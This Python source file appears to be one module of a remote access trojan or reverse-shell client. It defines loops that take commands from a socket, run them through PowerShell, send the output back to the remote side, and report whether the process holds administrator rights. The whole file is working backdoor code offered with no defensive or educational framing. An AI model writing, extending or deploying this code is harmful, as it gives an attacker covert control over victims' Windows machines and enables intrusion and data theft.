import subprocess
import ctypes
def run_command(my_socket):
    print("[+] Running System Command ")

    keep_running = True
    while keep_running:
        command = my_socket.receive_data()
        print("Entered Command is : ", command)
        if command == "stop" or command == "exit":
            keep_running = False
            command_result = "[-] Exiting"
        elif command == "status":
            command_result = str(is_admin())

        else:
            output = subprocess.run(["powershell.exe", command], shell=True, capture_output=True)
            if output.stderr.decode('utf-8') == "":
                cmd_result = (output.stdout.decode('utf-8'))
            else:
                cmd_result = (output.stderr.decode('utf-8'))
            command_result = cmd_result
        my_socket.send_data(command_result)

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False
def run_command_advanced(my_socket):
    print("[+] Running System Command ")

    keep_running = True
    while keep_running:
        command = my_socket.receive_data()
        print("Entered Command is : ", command)
        if command == "stop" or command == "exit":
            keep_running = False
            command_result = "[-] Exiting"



        else:
            if command != "status":
                output = subprocess.run(["powershell.exe", command], shell=True, capture_output=True)
                if output.stderr.decode('utf-8') == "":
                    cmd_result = (output.stdout.decode('utf-8'))
                else:
                    cmd_result = (output.stderr.decode('utf-8'))
                command_result = cmd_result
            else:
                command_result = str(is_admin())
        my_socket.send_serialized(command_result)


